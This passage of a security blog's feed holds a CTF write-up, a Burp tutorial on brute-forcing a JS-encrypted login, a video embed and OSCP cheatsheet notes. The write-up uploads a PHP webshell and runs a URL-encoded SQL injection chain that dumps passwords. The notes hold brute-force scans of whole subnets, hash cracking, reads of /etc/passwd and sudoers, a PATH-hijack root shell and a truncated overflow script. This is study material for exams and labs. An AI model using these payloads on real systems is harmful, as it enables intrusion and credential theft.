src="https://vuln.top/2020/08/23/2019shendun/image25.png" alt="https://vuln.top/2020/08/23/2019shendun/image25.png"></p><p>构造如下payload</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image26.png" alt="https://vuln.top/2020/08/23/2019shendun/image26.png"></p><p>获取到源码</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image27.png" alt="https://vuln.top/2020/08/23/2019shendun/image27.png"></p><p>找到他的命名规则</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image28.png" alt="https://vuln.top/2020/08/23/2019shendun/image28.png"></p><p>然后通过上传php webshell获取flag</p><p>先上传一个phpinfo</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image29.png" alt="https://vuln.top/2020/08/23/2019shendun/image29.png"></p><p><a href="http://e1a159267d144d59b49e72761929cf64efc380f27bcb4050.changame.ichunqiu.com/upload_u_c4nt_acc3ss/839f6ffc462c7485f936f01623a4fedf.touxiang.php" target="_blank" rel="noopener">http://e1a159267d144d59b49e72761929cf64efc380f27bcb4050.changame.ichunqiu.com/upload_u_c4nt_acc3ss/839f6ffc462c7485f936f01623a4fedf.touxiang.php</a></p><p>读到了文件但是没有执行</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image30.png" alt="https://vuln.top/2020/08/23/2019shendun/image30.png"></p><p>想到通过</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image31.png" alt="https://vuln.top/2020/08/23/2019shendun/image31.png"></p><script language="php">phpinfo();</script><p><img src="https://vuln.top/2020/08/23/2019shendun/image32.png" alt="https://vuln.top/2020/08/23/2019shendun/image32.png"></p><p>成功执行</p><p>运行 system(cat /flag)</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image33.png" alt="https://vuln.top/2020/08/23/2019shendun/image33.png"></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image34.png" alt="https://vuln.top/2020/08/23/2019shendun/image34.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{2742ab5468a78d70dca332ca48aa7b89}</strong></p><h1 id="0x06-Easysqli"><a href="#0x06-Easysqli" class="headerlink" title="0x06 Easysqli"></a>0x06 Easysqli</h1><p><strong>操作内容：</strong></p><p>首先登陆pow直接在cmd5上解密下就行</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image35.png" alt="https://vuln.top/2020/08/23/2019shendun/image35.png"></p><p>一开始尝试各种绕过都不行</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image36.png" alt="https://vuln.top/2020/08/23/2019shendun/image36.png"></p><p>后来提示了一波<code>bypass addslashes</code></p><p>通过google搜索</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image37.png" alt="https://vuln.top/2020/08/23/2019shendun/image37.png"></p><p>格式化字符串漏洞</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image38.png" alt="https://vuln.top/2020/08/23/2019shendun/image38.png"></p><p>找到payload %1$’</p><p>1．两张 admin%1$’%20union%20select%201,2%23</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image39.png" alt="https://vuln.top/2020/08/23/2019shendun/image39.png"></p><ol start="2"><li>查找表admin%1$’%20union%20select%20table_name,2%20from%20information_schema.tables%20where%20table_schema=database()%23</li></ol><p>表名user</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image40.png" alt="https://vuln.top/2020/08/23/2019shendun/image40.png"></p><ol start="3"><li>admin%1$’%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_schema=database()%23</li></ol><p>找到字段名</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image41.png" alt="https://vuln.top/2020/08/23/2019shendun/image41.png"></p><ol start="4"><li>admin%1$’%20union%20select%20username,password%20from%20user%23</li></ol><p>在password中找到flag</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image42.png" alt="https://vuln.top/2020/08/23/2019shendun/image42.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{299386fb699cff0cb99b1f57dee500a0}</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;首届“神盾杯”上海市网络安全竞赛&lt;/strong&gt;，去年的比赛。&lt;/p&gt;
&lt;h1 id=&quot;0x00-babyJS&quot;&gt;&lt;a href=&quot;#0x00-babyJS&quot; class=&quot;headerlink&quot; title=&quot;0x00 babyJS&quot;&gt;&lt;/a&gt;0x00 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>jsEncrypter 加密</title>
    <link href="https://vuln.top/2020/08/04/burpjs/"/>
    <id>https://vuln.top/2020/08/04/burpjs/</id>
    <published>2020-08-04T09:00:41.000Z</published>
    <updated>2021-05-09T01:55:24.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burp-爆破-JS加密"><a href="#burp-爆破-JS加密" class="headerlink" title="burp 爆破 JS加密"></a>burp 爆破 JS加密</h1><p>首先右键登录按钮属性查看html源代码，发现id=’rsa’</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled.png"></p><p>ctrl+shift+f 查找rsa描点，发现调用了strEnr</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%201.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%201.png"></p><p>继续查找strEnr，并进入函数</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%202.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%202.png"></p><p>对加密函数添加断点进行判断，发现123123账号密码进入了此处，且3个key分别为1，2，3。</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%203.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%203.png"></p><p>我们直接控制台调用，尝试加密解密</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%204.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%204.png"></p><p>保存des.js到本地</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%205.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%205.png"></p><p>既然找到了加密解密函数现在就是通过burp调用函数使其加解密,修改phantomjs_server.js</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%206.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%206.png"></p><p>载入server.js</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%207.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%207.png"></p><p>burp连接server端口，test，我们现在已经可以成功加密了</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%208.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%208.png"></p><p>配置burp intruder，添加变量</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%209.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%209.png"></p><p>选择Custom ，1为用户</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%2010.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%2010.png"></p><p>2为密码</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%2011.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%2011.png"></p><p>添加payload加密</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%2012.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%2012.png"></p><p>start attack，成功爆破</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%2013.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%2013.png"></p><p>尝试解密下加密字符串，成功</p><p><img src="https://vuln.top/2020/08/04/burpjs/Untitled%2014.png" alt="https://vuln.top/2020/08/04/burpjs/Untitled%2014.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;burp-爆破-JS加密&quot;&gt;&lt;a href=&quot;#burp-爆破-JS加密&quot; class=&quot;headerlink&quot; title=&quot;burp 爆破 JS加密&quot;&gt;&lt;/a&gt;burp 爆破 JS加密&lt;/h1&gt;&lt;p&gt;首先右键登录按钮属性查看html源代码，发现id=’rsa’
      
    
    </summary>
    
    
      <category term="burpsuite" scheme="https://vuln.top/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>2019国庆武夷山骑行</title>
    <link href="https://vuln.top/2020/07/15/wuyishan/"/>
    <id>https://vuln.top/2020/07/15/wuyishan/</id>
    <published>2020-07-15T13:16:58.000Z</published>
    <updated>2020-07-15T13:24:53.170Z</updated>
    
    <content type="html"><![CDATA[<iframe src="https://player.bilibili.com/player.html?aid=71155222&bvid=BV1BE411d77U&cid=123287020&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width: 100%; height: 500px; max-width: 100%；align:center; padding:20px 0;"> </iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;https://player.bilibili.com/player.html?aid=71155222&amp;bvid=BV1BE411d77U&amp;cid=123287020&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; framebor
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>整理OSCP备忘录</title>
    <link href="https://vuln.top/2020/07/15/OSCP%20198d9a6b020c4b6282f864863bbed9f3/"/>
    <id>https://vuln.top/2020/07/15/OSCP 198d9a6b020c4b6282f864863bbed9f3/</id>
    <published>2020-07-15T04:08:18.000Z</published>
    <updated>2020-07-15T12:14:32.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSCP备忘录"><a href="#OSCP备忘录" class="headerlink" title="OSCP备忘录"></a>OSCP备忘录</h1><ul><li>参考链接</li></ul><p><a href="https://github.com/xuanhusec/OscpStudyGroup" target="_blank" rel="noopener">https://github.com/xuanhusec/OscpStudyGroup</a></p><p><a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/" target="_blank" rel="noopener">https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</a></p><p><a href="https://github.com/RustyShackleford221/OSCP-Prep" target="_blank" rel="noopener">https://github.com/RustyShackleford221/OSCP-Prep</a></p><p><a href="http://www.securityidiots.com/Web-Pentest" target="_blank" rel="noopener">http://www.securityidiots.com/Web-Pentest</a></p><ul><li>考试指南：</li></ul><p><a href="https://www.lshack.cn/wp-content/uploads/2019/02/lshack.cn_2019-02-12_09-30-31.pdf" target="_blank" rel="noopener">https://www.lshack.cn/wp-content/uploads/2019/02/lshack.cn_2019-02-12_09-30-31.pdf</a></p><h1 id="快速扫描"><a href="#快速扫描" class="headerlink" title="快速扫描"></a>快速扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535 10.10.10.10 --rate=1000 &gt; ports</span><br><span class="line">ports=$(cat ports | awk -F &quot; &quot; &apos;&#123;print $4&#125;&apos; | awk -F &quot;/&quot; &apos;&#123;print $1&#125;&apos; | sort -n | tr &apos;\n&apos; &apos;,&apos; | sed &apos;s/,$//&apos;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 10.10.10.10</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O --top-ports <span class="number">50</span> --open -oA nmap/initial &lt;ip or cidr&gt;</span><br><span class="line">nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;</span><br><span class="line">nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --scripts vuln,safe,discovery -p <span class="number">443</span>,<span class="number">80</span> &lt;ip or cidr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">王牌命令：</span><br><span class="line"></span><br><span class="line">nmap -sS --osscan-guess -A -vv --script=vuln x.x.x.x</span><br><span class="line"></span><br><span class="line">nmap -sF -A --version-all -sC --osscan-guess -F -n -sV</span><br><span class="line"></span><br><span class="line">利用 nmap 一句话进行目标 C 段常规漏洞扫描：</span><br><span class="line"></span><br><span class="line">nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010<span class="number">-4221.</span>nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve<span class="number">-2012</span><span class="number">-1182.</span>nse,smb-vuln-ms08<span class="number">-067.</span>nse,smb-vuln-ms17<span class="number">-010.</span>nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse x.x.x<span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">利用 nmap 一句话进行目标 C 段弱口令爆破：</span><br><span class="line"></span><br><span class="line">nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse x.x.x<span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">nmap 扫 smb：</span><br><span class="line"></span><br><span class="line">nmap -p <span class="number">445</span> -vv --script=smb-vuln-cve2009<span class="number">-3103.</span>nse,smb-vuln-ms06<span class="number">-025.</span>nse,smb-vuln-ms07<span class="number">-029.</span>nse,smb-vuln-ms08<span class="number">-067.</span>nse,smb-vuln-ms10<span class="number">-054.</span>nse,smb-vuln-ms10<span class="number">-061.</span>nse,smb-vuln-ms17<span class="number">-010.</span>nse x.x.x.x</span><br></pre></td></tr></table></figure><h1 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -d <span class="number">5</span> -m <span class="number">3</span> -w pass.lst [http:<span class="comment">//](http://fuse.fabricorp.local/papercut/logs/html/index.htm)$ip --with-numbers</span></span><br></pre></td></tr></table></figure><h1 id="python-pty-方式"><a href="#python-pty-方式" class="headerlink" title="python pty 方式"></a>python pty 方式</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'**import**("pty").spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure><h1 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -z file,directory-list<span class="number">-2.3</span>-medium.txt --hc <span class="number">404</span> <span class="string">"[http://192.168.235.133/FUZZ](http://192.168.235.133/FUZZ)"</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:<span class="comment">//10.10.10.194 -t 50 -w directory-list-2.3-medium.txt -x .php,.html</span></span><br><span class="line">gobuster -s <span class="number">200</span>,<span class="number">204</span>,<span class="number">301</span>,<span class="number">302</span>,<span class="number">307</span>,<span class="number">403</span> -u http:<span class="comment">//x.x.x.x -w /usr/share/wordlists/xxxx.txt -t 80 -a ‘Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0’</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -Format txt -o webscan/nikto-initial -host [http:<span class="comment">//192.168.24.24](http://192.168.24.24/) -p 8080</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list<span class="number">-2.3</span>-small.txt -u [http:<span class="comment">//192.168.24.24/FUZZ](http://192.168.24.24/FUZZ)</span></span><br></pre></td></tr></table></figure><h1 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h [http:<span class="comment">//192.168.235.133](http://192.168.235.133/)</span></span><br></pre></td></tr></table></figure><h1 id="本地HASH爆破"><a href="#本地HASH爆破" class="headerlink" title="本地HASH爆破"></a>本地HASH爆破</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">John 爆破相关：</span><br><span class="line">john unshadow.db</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashcat SHA512 $<span class="number">6</span>$shadow file</span><br><span class="line">hashcat -m <span class="number">1800</span> -a <span class="number">0</span> hash.txt rockyou.txt --username</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashcat MD5 $<span class="number">1</span>$shadow fil</span><br><span class="line">hashcat -m <span class="number">500</span> -a <span class="number">0</span> hash.txt rockyou.txt --username</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashcat MD5 Apache webdav file</span><br><span class="line">hashcat -m <span class="number">1600</span> -a <span class="number">0</span> hash.txt rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashcat SHA1</span><br><span class="line">hashcat -m <span class="number">100</span> -a <span class="number">0</span> hash.txt rockyou.txt --force</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashcat Wordpress</span><br><span class="line">hashcat -m <span class="number">400</span> -a <span class="number">0</span> --remove hash.txt rockyou.txt</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc<span class="comment">/*-release</span></span><br><span class="line"><span class="comment">  cat /etc/lsb-release      # Debian based</span></span><br><span class="line"><span class="comment">  cat /etc/redhat-release   # Redhat based</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">kernel version</span></span><br><span class="line"><span class="comment">cat /proc/version</span></span><br><span class="line"><span class="comment">uname -a</span></span><br><span class="line"><span class="comment">uname -mrs</span></span><br><span class="line"><span class="comment">rpm -q kernel</span></span><br><span class="line"><span class="comment">dmesg | grep Linux</span></span><br><span class="line"><span class="comment">ls /boot | grep vmlinuz-</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">environmental </span></span><br><span class="line"><span class="comment">cat /etc/profile</span></span><br><span class="line"><span class="comment">cat /etc/bashrc</span></span><br><span class="line"><span class="comment">cat ~/.bash_profile</span></span><br><span class="line"><span class="comment">cat ~/.bashrc</span></span><br><span class="line"><span class="comment">cat ~/.bash_logout</span></span><br><span class="line"><span class="comment">env</span></span><br><span class="line"><span class="comment">set</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printer</span></span><br><span class="line"><span class="comment">lpstat -a</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Applications</span></span><br><span class="line"><span class="comment">ps aux</span></span><br><span class="line"><span class="comment">ps -ef</span></span><br><span class="line"><span class="comment">top</span></span><br><span class="line"><span class="comment">cat /etc/services</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">service by root</span></span><br><span class="line"><span class="comment">ps aux | grep root</span></span><br><span class="line"><span class="comment">ps -ef | grep root</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Confidential Information</span></span><br><span class="line"><span class="comment">id</span></span><br><span class="line"><span class="comment">who</span></span><br><span class="line"><span class="comment">w</span></span><br><span class="line"><span class="comment">last</span></span><br><span class="line"><span class="comment">cat /etc/passwd | cut -d: -f1    # List of users</span></span><br><span class="line"><span class="comment">grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;'   # List of super users</span></span><br><span class="line"><span class="comment">awk -F: '($3 == "0") &#123;print&#125;' /etc/passwd   # List of super users</span></span><br><span class="line"><span class="comment">cat /etc/sudoers</span></span><br><span class="line"><span class="comment">sudo -l</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</span></span><br></pre></td></tr></table></figure><h2 id="SUID-amp-GUID提权"><a href="#SUID-amp-GUID提权" class="headerlink" title="SUID&amp;GUID提权"></a>SUID&amp;GUID提权</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span><br><span class="line">for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span><br><span class="line"></span><br><span class="line"># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span><br><span class="line">find / -perm -g=s -o -perm <span class="number">-4000</span> ! -type l -maxdepth <span class="number">3</span> -exec ls -ld &#123;&#125; \; <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><h2 id="sudo查看是否存在提权软件"><a href="#sudo查看是否存在提权软件" class="headerlink" title="sudo查看是否存在提权软件"></a>sudo查看是否存在提权软件</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h2 id="RBASH"><a href="#RBASH" class="headerlink" title="RBASH"></a>RBASH</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL</span><br><span class="line">基本上都是/bin/rbash</span><br><span class="line">检查可用的编程语言，如python、perl、ruby等</span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/system/188989.html</span></span><br></pre></td></tr></table></figure><h2 id="操纵环境变量"><a href="#操纵环境变量" class="headerlink" title="操纵环境变量"></a>操纵环境变量</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">找到了suid权限的程序msgmike，运行该程序，并且使用strings命令，可以得知该程序调用了cat命令。</span><br><span class="line">于是操纵环境变量，以本地目录开始查找cat，并且伪造一个cat命令。</span><br><span class="line"></span><br><span class="line">echo <span class="string">"/bin/sh"</span> &gt; cat</span><br><span class="line"></span><br><span class="line">添加环境变量<span class="keyword">export</span> PATH=.:$PATH;chmod +x cat 于是运行该suid权限的程序，就会运行伪造的cat命令，调用了/bin/sh。使用这种方法提权。</span><br></pre></td></tr></table></figure><ul><li>Linux提权<ul><li><a href="https://github.com/HappyTreeFriend/kernel-exploits" target="_blank" rel="noopener">https://github.com/HappyTreeFriend/kernel-exploits</a></li><li><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">https://www.securitysift.com/download/linuxprivchecker.py</a></li><li><a href="https://github.com/HappyTreeFriend/linux-exploit-suggester" target="_blank" rel="noopener">https://github.com/HappyTreeFriend/linux-exploit-suggester</a></li><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li><li>Linux提权指南</li><li>Linux提权辅助脚本</li><li>LinuxExploits</li></ul></li><li>Windows提取<ul><li><a href="https://github.com/abatchy17/WindowsExploits" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits</a></li><li><a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/windows-privesc-check</a></li><li><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></li><li>Windows提权指南</li><li>Windows提权辅助脚本</li><li>WindowsExploits</li></ul></li></ul><h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line"></span><br><span class="line"># EIP偏移</span><br><span class="line"># 创建测试字符串 方法1： 使用命令“!mona pattern_create 3000 ”</span><br><span class="line"># 创建测试字符串 方法2：使用msf框架，命令如下</span><br><span class="line">#  “/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 ”</span><br><span class="line"># 发送后程序崩溃看调试器中EIP的值，然后用下面命令查找EIP偏移</span><br><span class="line"># 查找EIP偏移 方法1：使用命令“!mona pattern_offset &lt;EIP的值&gt;” </span><br><span class="line"># 查找EIP偏移 方法2：使用msf框架，命令如下 </span><br><span class="line">#  “/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q &lt;EIP的值&gt;”</span><br><span class="line"># 获得EIP偏移后替换下面eip_offset的值</span><br><span class="line"></span><br><span class="line">eip_offset = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"># 用“A”填充缓冲区，直到EIP偏移位置</span><br><span class="line"></span><br><span class="line">junk = <span class="string">"A"</span> * 